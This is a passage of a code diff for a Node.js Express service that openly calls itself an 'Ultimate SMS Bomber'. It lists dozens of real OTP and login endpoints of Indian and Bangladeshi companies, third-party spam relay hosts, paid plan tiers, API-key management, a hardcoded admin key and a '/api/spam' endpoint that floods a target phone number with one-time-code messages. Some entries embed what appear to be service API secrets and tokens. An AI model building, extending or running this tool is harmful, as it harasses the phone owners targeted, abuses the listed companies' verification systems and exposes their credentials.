-  { id: 63, name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"} },
-  { id: 64, name: "Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: {"phone_number": "{phone}", "language": "en"} },
-  { id: 65, name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"} },
-  { id: 66, name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" }
-];
-
-// -------- INTERNATIONAL APIS (101-150) --------
-const INTERNATIONAL_APIS = [
-  { id: 101, name: "API-6 BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
-  { id: 102, name: "API-7 Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
-  { id: 103, name: "API-8 MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
-  { id: 104, name: "API-9 Housing", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
-  { id: 105, name: "API-10 RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
-  { id: 106, name: "API-11 Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
-  { id: 107, name: "API-12 Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
-  { id: 108, name: "API-13 Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
-  { id: 109, name: "API-14 Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
-  { id: 110, name: "API-15 Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
-  { id: 111, name: "API-16 GP MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
-  { id: 112, name: "API-17 Shukhee", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
-  { id: 113, name: "API-18 MedEasy", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
-  { id: 114, name: "API-19 Ultranet", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
-  { id: 115, name: "API-20 eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
-  { id: 116, name: "API-21 Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
-  { id: 117, name: "API-22 Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
-  { id: 118, name: "API-23 Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
-  { id: 119, name: "API-24 GP Web", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
-  { id: 120, name: "API-25 GP FWA", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
-  { id: 121, name: "API-26 BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
-  { id: 122, name: "API-27 Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
-  { id: 123, name: "API-28 OsudPotro", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
-  { id: 124, name: "API-29 Apex4u", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
-  { id: 125, name: "API-30 Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
-  { id: 126, name: "API-31 Fundesh", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
-  { id: 127, name: "API-32 Jatri", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
-  { id: 128, name: "API-33 RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
-  { id: 129, name: "API-34 RabbitHole", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
-  { id: 130, name: "API-35 Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
-  { id: 131, name: "API-36 Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
-  { id: 132, name: "API-37 Training", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
-  { id: 133, name: "API-38 Shikho Discount", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
-  { id: 134, name: "API-39 Easy", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
-  { id: 135, name: "API-40 Robi DA", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
-  { id: 136, name: "API-41 Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
-  { id: 137, name: "API-42 Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
-  { id: 138, name: "API-43 Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
-  { id: 139, name: "API-44 Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
-  { id: 140, name: "API-45 DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
-  { id: 141, name: "API-46 Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
-  { id: 142, name: "API-47 Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
-  { id: 143, name: "API-48 UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
-  { id: 144, name: "API-49 Chorki", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
-  { id: 145, name: "API-50 Arogga", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
-  { id: 146, name: "API-51 Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
-  { id: 147, name: "API-52 AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
-  { id: 148, name: "API-53 Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
-  { id: 149, name: "API-54 Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
-  { id: 150, name: "API-55 Jayabaji", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} }
-];
-
-// -------- GX APIS (151-200) --------
-const GX_APIS = [];
-for (let i = 1; i <= 50; i++) {
-  GX_APIS.push({
-    id: 150 + i,
-    name: `GX API ${i}`,
-    method: "GET",
-    url: `https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}`,
-    isShadowX: true
-  });
-}
-
-// -------- LMNx9 APIS (201-310) --------
-const LMNX9_APIS = [];
-for (let i = 1; i <= 110; i++) {
-  LMNX9_APIS.push({
-    id: 200 + i,
-    name: `LMNx9 API${i}`,
-    method: "GET",
-    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
-    isLMNx9: true
-  });
-}
-
-// -------- DUMMY APIS FOR TESTING (311-350) --------
-const DUMMY_APIS = [];
-for (let i = 1; i <= 40; i++) {
-  DUMMY_APIS.push({
-    id: 310 + i,
-    name: `Dummy API ${i}`,
-    method: "GET",
-    url: `https://httpbin.org/get?phone={phone}`,
-    isDummy: true
-  });
-}
-
-// -------- COMBINE ALL APIS --------
-const SMS_APIS = [
-  ...ORIGINAL_APIS,
-  ...INDIAN_APIS,
-  ...INTERNATIONAL_APIS,
-  ...GX_APIS,
-  ...LMNX9_APIS,
-  ...DUMMY_APIS
-];
-
-console.log(`📡 Total APIs loaded: ${SMS_APIS.length}`);
-
-// ============================================================
-// PART 7: PLAN CONFIGURATION (100 lines)
-// ============================================================
-
-const PLAN_CONFIG = {
-  default: {
-    name: 'Default',
-    maxCount: 300,
-    requiresKey: false,
-    rateLimit: 100,
-    priority: 1,
-    description: 'Default plan - 300 SMS/API, No key required',
-    features: ['Basic SMS', 'Stop/Pause/Resume', 'Basic Analytics']
-  },
-  free: {
-    name: 'Free',
-    maxCount: 50,
-    requiresKey: false,
-    rateLimit: 50,
-    priority: 1,
-    description: 'Free plan - 50 SMS/API, No key required',
-    features: ['Basic SMS', 'Stop/Pause/Resume', 'Basic Analytics']
-  },
-  premium: {
-    name: 'Premium',
-    maxCount: 10000,
-    requiresKey: true,
-    rateLimit: 1000,
-    priority: 3,
-    description: 'Premium plan - 10,000 SMS/API, Key required',
-    features: ['Advanced SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue']
-  },
-  enterprise: {
-    name: 'Enterprise',
-    maxCount: 50000,
-    requiresKey: true,
-    rateLimit: 5000,
-    priority: 5,
-    description: 'Enterprise plan - 50,000 SMS/API, Key required',
-    features: ['Enterprise SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks']
-  },
-  unlimited: {
-    name: 'Unlimited',
-    maxCount: 100000,
-    requiresKey: true,
-    rateLimit: 10000,
-    priority: 10,
-    description: 'Unlimited plan - 100,000 SMS/API, Key required',
-    features: ['Unlimited SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks', 'Dedicated Support']
-  }
-};
-
-// ============================================================
-// PART 8: KEY MANAGEMENT (300 lines)
-// ============================================================
-
-class KeyManager {
-  constructor() {
-    this.keysFile = path.join(__dirname, 'keys.json');
-    this.validKeys = this.loadKeys();
-    this.keyHistory = [];
-    this.maxHistory = 1000;
-    this.rateLimits = new Map();
-    this.keyUsage = new Map();
-    this.cleanupInterval = setInterval(() => this.cleanup(), 3600000);
-  }
-
-  loadKeys() {
-    try {
-      if (fs.existsSync(this.keysFile)) {
-        const data = fs.readFileSync(this.keysFile, 'utf8');
-        const parsed = JSON.parse(data);
-        const keysMap = new Map();
-        Object.entries(parsed).forEach(([key, value]) => {
-          keysMap.set(key, {
-            expiry: new Date(value.expiry),
-            plan: value.plan || 'premium',
-            created: new Date(value.created),
-            lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
-            usageCount: value.usageCount || 0,
-            active: value.active !== false
-          });
-        });
-        return keysMap;
-      }
-    } catch (error) {
-      console.error('Error loading keys:', error.message);
-    }
-    return new Map();
-  }
-
-  saveKeys() {
-    try {
-      const obj = {};
-      for (const [key, value] of this.validKeys.entries()) {
-        obj[key] = {
-          expiry: value.expiry.toISOString(),
-          plan: value.plan,
-          created: value.created.toISOString(),
-          lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
-          usageCount: value.usageCount || 0,
-          active: value.active !== false
-        };
-      }
-      fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2));
-      return true;
-    } catch (error) {
-      console.error('Error saving keys:', error.message);
-      return false;
-    }
-  }
-
-  generateKey(plan = 'premium', days = 365) {
-    const apiKey = Utility.generateApiKey();
-    const expiryDate = new Date();
-    expiryDate.setDate(expiryDate.getDate() + days);
-    
-    this.validKeys.set(apiKey, {
-      expiry: expiryDate,
-      plan: plan,
-      created: new Date(),
-      lastUsed: null,
-      usageCount: 0,
-      active: true
-    });
-    this.saveKeys();
-    
-    this.keyHistory.push({
-      key: apiKey,
-      plan: plan,
-      generated: Date.now(),
-      expires: expiryDate.toISOString()
-    });
-    
-    if (this.keyHistory.length > this.maxHistory) {
-      this.keyHistory.shift();
-    }
-    
-    return { apiKey, expiryDate, plan };
-  }
-
-  validateKey(key) {
-    if (!this.validKeys.has(key)) return false;
-    const keyData = this.validKeys.get(key);
-    if (!keyData.active) return false;
-    return new Date() < keyData.expiry;
-  }
-
-  getKeyInfo(key) {
-    if (!this.validKeys.has(key)) return null;
-    const keyData = this.validKeys.get(key);
-    return {
-      key: key,
-      plan: keyData.plan,
-      expires: keyData.expiry.toISOString(),
-      valid: new Date() < keyData.expiry && keyData.active,
-      daysLeft: Math.max(0, Math.ceil((keyData.expiry - new Date()) / (1000 * 60 * 60 * 24))),
-      created: keyData.created.toISOString(),
-      lastUsed: keyData.lastUsed ? keyData.lastUsed.toISOString() : null,
-      usageCount: keyData.usageCount || 0,
-      active: keyData.active
-    };
-  }
-
-  useKey(key) {
-    if (!this.validateKey(key)) return false;
-    const keyData = this.validKeys.get(key);
-    keyData.lastUsed = new Date();
-    keyData.usageCount = (keyData.usageCount || 0) + 1;
-    this.saveKeys();
-    
-    // Track usage for rate limiting
-    if (!this.keyUsage.has(key)) {
-      this.keyUsage.set(key, { count: 0, resetTime: Date.now() + 60000 });
-    }
-    const usage = this.keyUsage.get(key);
-    if (Date.now() > usage.resetTime) {
-      usage.count = 0;
-      usage.resetTime = Date.now() + 60000;
-    }
-    usage.count++;
-    this.keyUsage.set(key, usage);
-    
-    return true;
-  }
-
-  getKeyUsage(key) {
-    if (!this.keyUsage.has(key)) return { count: 0, limit: this.getRateLimit(key) };
-    const usage = this.keyUsage.get(key);
-    return {
-      count: usage.count,
-      limit: this.getRateLimit(key),
-      remaining: Math.max(0, this.getRateLimit(key) - usage.count)
-    };
-  }
-
-  getRateLimit(key) {
-    const keyData = this.validKeys.get(key);
-    if (!keyData) return 0;
-    const planLimits = {
-      premium: 1000,
-      enterprise: 5000,
-      unlimited: 10000
-    };
-    return planLimits[keyData.plan] || 100;
-  }
-
-  revokeKey(key) {
-    if (this.validKeys.has(key)) {
-      const keyData = this.validKeys.get(key);
-      keyData.active = false;
-      this.saveKeys();
-      return true;
-    }
-    return false;
-  }
-
-  getAllKeys() {
-    const keys = [];
-    for (const [key, value] of this.validKeys.entries()) {
-      keys.push({
-        key: key,
-        plan: value.plan,
-        expires: value.expiry.toISOString(),
-        valid: new Date() < value.expiry && value.active,
-        daysLeft: Math.max(0, Math.ceil((value.expiry - new Date()) / (1000 * 60 * 60 * 24))),
-        created: value.created.toISOString(),
-        lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
-        usageCount: value.usageCount || 0,
-        active: value.active !== false
-      });
-    }
-    return keys;
-  }
-
-  cleanup() {
-    const now = new Date();
-    let count = 0;
-    for (const [key, value] of this.validKeys.entries()) {
-      if (now > value.expiry || !value.active) {
-        this.validKeys.delete(key);
-        count++;
-      }
-    }
-    if (count > 0) {
-      this.saveKeys();
-      console.log(`🧹 Cleaned up ${count} expired/inactive keys`);
-    }
-    return count;
-  }
-
-  destroy() {
-    if (this.cleanupInterval) {
-      clearInterval(this.cleanupInterval);
-    }
-  }
-}
-
-// ============================================================
-// PART 9: RATE LIMITER (200 lines)
-// ============================================================
-
-class RateLimiter {
-  constructor() {
-    this.requests = new Map();
-    this.cleanupInterval = setInterval(() => this.cleanup(), 60000);
-  }
-
-  checkLimit(ip, key = null) {
-    if (!CONFIG.security.rateLimit.enabled) return true;
-    
-    const identifier = key || ip;
-    const now = Date.now();
-    const windowMs = CONFIG.security.rateLimit.windowMs;
-    const maxRequests = CONFIG.security.rateLimit.maxRequests;
-    
-    if (!this.requests.has(identifier)) {
-      this.requests.set(identifier, []);
-    }
-    
-    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
-    timestamps.push(now);
-    this.requests.set(identifier, timestamps);
-    
-    if (timestamps.length > maxRequests) {
-      return false;
-    }
-    
-    return true;
-  }
-
-  getRemaining(ip, key = null) {
-    const identifier = key || ip;
-    const now = Date.now();
-    const windowMs = CONFIG.security.rateLimit.windowMs;
-    const maxRequests = CONFIG.security.rateLimit.maxRequests;
-    
-    if (!this.requests.has(identifier)) return maxRequests;
-    
-    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
-    return Math.max(0, maxRequests - timestamps.length);
-  }
-
-  getResetTime(ip, key = null) {
-    const identifier = key || ip;
-    const now = Date.now();
-    const windowMs = CONFIG.security.rateLimit.windowMs;
-    
-    if (!this.requests.has(identifier)) return 0;
-    
-    const timestamps = this.requests.get(identifier);
-    if (timestamps.length === 0) return 0;
-    
-    const oldest = timestamps[0];
-    return Math.max(0, windowMs - (now - oldest));
-  }
-
-  cleanup() {
-    const now = Date.now();
-    const windowMs = CONFIG.security.rateLimit.windowMs;
-    for (const [key, timestamps] of this.requests.entries()) {
-      const filtered = timestamps.filter(t => now - t < windowMs);
-      if (filtered.length === 0) {
-        this.requests.delete(key);
-      } else {
-        this.requests.set(key, filtered);
-      }
-    }
-  }
-
-  destroy() {
-    if (this.cleanupInterval) {
-      clearInterval(this.cleanupInterval);
-    }
-  }
-}
-
-// ============================================================
-// PART 10: EXPRESS APP SETUP (500 lines)
+// PART 10: EXPRESS APP SETUP
 // ============================================================
 
 const app = express();
@@ -1492,7 +1553,7 @@ app.use((req, res, next) => {
   const start = Date.now();
   res.on('finish', () => {
     const duration = Date.now() - start;
-    console.log(`📝 [${Utility.getCurrentTime()}] ${req.method} ${req.url} - ${res.statusCode} - ${duration}ms - ${req.requestId}`);
+    console.log(`📝 [${Utility.getCurrentTime()}] ${req.method} ${req.url} - ${res.statusCode} - ${duration}ms`);
   });
   next();
 });
@@ -1526,20 +1587,43 @@ app.use((req, res, next) => {
 });
 
 // ============================================================
-// PART 11: API ENDPOINTS - COMPLETE (2000 lines)
+// PART 11: API ENDPOINTS
 // ============================================================
 
-// -------- ROOT --------
+// Root
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, '../public/index.html'));
+  res.json({
+    success: true,
+    developer: DEVELOPER_INFO,
+    version: "7.0.0-ULTIMATE-BD",
+    country: "Bangladesh Only",
+    total_apis: ALL_BANGLADESH_APIS.length,
+    message: "Ultimate SMS Bomber - Bangladesh Only Version",
+    endpoints: {
+      api_info: "/api",
+      generate_key: "/api/create-key?plan=premium&days=30&admin_key=TNEH_ADMIN_2024",
+      check_key: "/api/check-key?key=YOUR_KEY",
+      spam: "/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100",
+      stop: "/api/stop?key=YOUR_KEY&all=true",
+      pause: "/api/pause?key=YOUR_KEY&all=true",
+      resume: "/api/resume?key=YOUR_KEY&all=true",
+      status: "/api/status?key=YOUR_KEY",
+      stats: "/api/stats",
+      health: "/api/health",
+      debug_keys: "/api/debug/keys?admin_key=TNEH_ADMIN_2024"
+    },
+    requestId: req.requestId
+  });
 });
 
-// -------- API INFO --------
+// API Info
 app.get('/api', (req, res) => {
   res.json({
+    success: true,
     developer: DEVELOPER_INFO,
-    version: "7.0.0-ULTIMATE",
-    total_apis: SMS_APIS.length,
+    version: "7.0.0-ULTIMATE-BD",
+    country: "Bangladesh Only",
+    total_bangladesh_apis: ALL_BANGLADESH_APIS.length,
     plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
       acc[key] = {
         max_count: PLAN_CONFIG[key].maxCount,
@@ -1549,49 +1633,131 @@ app.get('/api', (req, res) => {
       };
       return acc;
     }, {}),
-    endpoints: {
-      root: "/",
-      api_info: "/api",
-      spam: "/api/spam?number=017XXXXXXXX&count=300",
-      stop: "/api/stop?jobId=JOB_ID or ?all=true",
-      pause: "/api/pause?jobId=JOB_ID or ?all=true",
-      resume: "/api/resume?jobId=JOB_ID or ?all=true",
-      status: "/api/status",
-      stats: "/api/stats",
-      health: "/api/health",
-      apis: "/api/apis",
-      generate_key: "/api/expiredate=30&createkey",
-      check_key: "/api/checkkey?key=YOUR_KEY",
-      logs: "/api/logs",
-      analytics: "/api/analytics",
-      cleanup: "/api/cleanup",
-      keys: "/api/admin/keys"
-    }
+    key_storage: keyManager.getStorageInfo(),
+    requestId: req.requestId
   });
 });
 
-// -------- SPAM ENDPOINT --------
-app.get('/api/spam', async (req, res) => {
-  const startTime = Date.now();
-  const { plan, number, count = 1, key } = req.query;
+// Generate API Key (FIXED - Now properly saves)
+app.get('/api/create-key', (req, res) => {
+  const { plan = 'premium', days = '30', admin_key } = req.query;
   
-  let currentPlan = 'default';
-  let planConfig = PLAN_CONFIG.default;
-  
-  if (plan && PLAN_CONFIG[plan]) {
-    currentPlan = plan;
-    planConfig = PLAN_CONFIG[plan];
+  // Admin verification
+  if (admin_key !== 'TNEH_ADMIN_2024') {
+    return res.status(403).json({
+      success: false,
+      error: 'Invalid admin key. Required for API key generation',
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
   }
+  
+  // Validate plan
+  if (!PLAN_CONFIG[plan]) {
+    return res.status(400).json({
+      success: false,
+      error: `Invalid plan: ${plan}`,
+      available_plans: Object.keys(PLAN_CONFIG),
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+  
+  const validDays = Math.min(Math.max(parseInt(days) || 30, 1), 365);
+  
+  try {
+    const result = keyManager.generateKey(plan, validDays);
+    
+    res.json({
+      success: true,
+      api_key: result.apiKey,
+      plan: result.plan,
+      plan_limit: PLAN_CONFIG[plan].maxCount,
+      expires_in_days: validDays,
+      expiry_date: result.expiryDate.toISOString(),
+      saved_to_file: true,
+      storage_info: keyManager.getStorageInfo(),
+      usage_example: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=${PLAN_CONFIG[plan].maxCount}`,
+      important: 'SAVE THIS KEY! It will not be shown again.',
+      endpoints: {
+        check_key: `/api/check-key?key=${result.apiKey}`,
+        spam: `/api/spam?plan=${plan}&key=${result.apiKey}&number=017XXXXXXXX&count=100`,
+        stop: `/api/stop?key=${result.apiKey}&all=true`,
+        status: `/api/status?key=${result.apiKey}`
+      },
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId,
+      timestamp: Utility.getISOString()
+    });
+  } catch (error) {
+    console.error('Key generation error:', error);
+    return res.status(500).json({
+      success: false,
+      error: ERROR_MESSAGES.KEY_GENERATION_FAILED,
+      details: error.message,
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+});
+
+// Check API Key
+app.get('/api/check-key', (req, res) => {
+  const { key } = req.query;
+  
+  if (!key) {
+    return res.status(400).json({
+      success: false,
+      error: 'Missing key parameter',
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+  
+  const keyInfo = keyManager.getKeyInfo(key);
+  
+  if (!keyInfo) {
+    return res.status(404).json({
+      success: false,
+      error: 'API key not found',
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+  
+  res.json({
+    success: true,
+    key_info: keyInfo,
+    developer: DEVELOPER_INFO,
+    requestId: req.requestId
+  });
+});
+
+// Spam Endpoint (Bangladesh Only)
+app.get('/api/spam', async (req, res) => {
+  const { plan = 'premium', number, count = '100', key } = req.query;
+  
+  // Validate plan
+  if (!PLAN_CONFIG[plan]) {
+    return res.status(400).json({
+      success: false,
+      error: `Invalid plan: ${plan}`,
+      available_plans: Object.keys(PLAN_CONFIG),
+      developer: DEVELOPER_INFO,
+      requestId: req.requestId
+    });
+  }
+  
+  const planConfig = PLAN_CONFIG[plan];
   
   // Check API key if required
   if (planConfig.requiresKey) {
     if (!key) {
       return res.status(401).json({
         success: false,
-        error: ERROR_MESSAGES.INVALID_API_KEY,
+        error: 'API key required for this plan',
         developer: DEVELOPER_INFO,
-        plan: currentPlan,
-        generate_key: '/api/expiredate=30&createkey',
+        generate_key: '/api/create-key?plan=' + plan + '&days=30&admin_key=TNEH_ADMIN_2024',
         requestId: req.requestId
       });
     }
@@ -1600,39 +1766,23 @@ app.get('/api/spam', async (req, res) => {
       return res.status(401).json({
         success: false,
         error: ERROR_MESSAGES.INVALID_API_KEY,
-        developer: DEVELOPER_INFO,
         keyInfo: keyManager.getKeyInfo(key),
-        requestId: req.requestId
-      });
-    }
-    
-    // Track key usage
-    keyManager.useKey(key);
-    
-    // Check key rate limit
-    const usage = keyManager.getKeyUsage(key);
-    if (usage.count > usage.limit) {
-      return res.status(429).json({
-        success: false,
-        error: 'Key rate limit exceeded',
         developer: DEVELOPER_INFO,
-        limit: usage.limit,
-        used: usage.count,
-        remaining: usage.remaining,
         requestId: req.requestId
       });
     }
+    
+    keyManager.useKey(key);
   }
   
   // Validate number
   if (!number) {
     return res.status(400).json({
       success: false,
-      error: ERROR_MESSAGES.MISSING_PARAM,
+      error: 'Missing phone number',
       developer: DEVELOPER_INFO,
-      param: 'number',
-      requestId: req.requestId,
-      usage: `/api/spam?number=017XXXXXXXX&count=${planConfig.maxCount}`
+      usage: '/api/spam?plan=premium&key=YOUR_KEY&number=017XXXXXXXX&count=100',
+      requestId: req.requestId
     });
   }
   
@@ -1642,8 +1792,8 @@ app.get('/api/spam', async (req, res) => {
       success: false,
       error: ERROR_MESSAGES.INVALID_PHONE,
       developer: DEVELOPER_INFO,
-      requestId: req.requestId,
-      example: '017XXXXXXXX or 88017XXXXXXXX'
+      example: '017XXXXXXXX or 88017XXXXXXXX',
+      requestId: req.requestId
     });
   }
   
@@ -1653,30 +1803,33 @@ app.get('/api/spam', async (req, res) => {
   if (perApiCount > planConfig.maxCount) {
     return res.status(400).json({
       success: false,
-      error: `Count exceeds ${currentPlan} plan limit (${planConfig.maxCount})`,
-      developer: DEVELOPER_INFO,
-      plan: currentPlan,
+      error: `Count exceeds ${plan} plan limit (${planConfig.maxCount})`,
+      plan: plan,
       max_allowed: planConfig.maxCount,
       requested: perApiCount,
+      developer: DEVELOPER_INFO,
       requestId: req.requestId
     });
   }
   
+  // Use Bangladesh APIs only
+  const apiCount = ALL_BANGLADESH_APIS.length;
+  const totalSMS = apiCount * perApiCount;
+  
   // Register job
-  const totalSMS = SMS_APIS.length * perApiCount;
   const jobId = bombController.registerJob(cleanNumber, totalSMS, {
-    plan: currentPlan,
+    plan: plan,
     perApiCount: perApiCount,
     ip: req.ip,
     key: key || null
   });
   
-  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
+  console.log(`🇧🇩 [${plan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${apiCount} SMS to ${Utility.maskPhone(cleanNumber)}`);
   
   // Start async processing
   (async () => {
     try {
-      const results = await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
+      await sendBatch(ALL_BANGLADESH_APIS, cleanNumber, perApiCount, jobId, bombController);
       console.log(`✅ JOB ${jobId} completed!`);
     } catch (error) {
       console.error(`❌ JOB ${jobId} failed:`, error.message);
@@ -1684,34 +1837,30 @@ app.get('/api/spam', async (req, res) => {
     }
   })();
   
-  const response = {
+  res.json({
     success: true,
     developer: DEVELOPER_INFO,
     jobId: jobId,
-    plan: currentPlan,
-    plan_description: planConfig.description,
+    plan: plan,
+    country: 'Bangladesh Only',
     target_number: Utility.maskPhone(cleanNumber),
     per_api_count: perApiCount,
-    total_apis: SMS_APIS.length,
+    total_bangladesh_apis: apiCount,
     total_sms: totalSMS,
     status: 'started',
-    message: 'Bombing started successfully',
+    message: 'Bombing started with Bangladesh APIs only',
+    control_endpoints: {
+      stop: `/api/stop?jobId=${jobId}`,
+      pause: `/api/pause?jobId=${jobId}`,
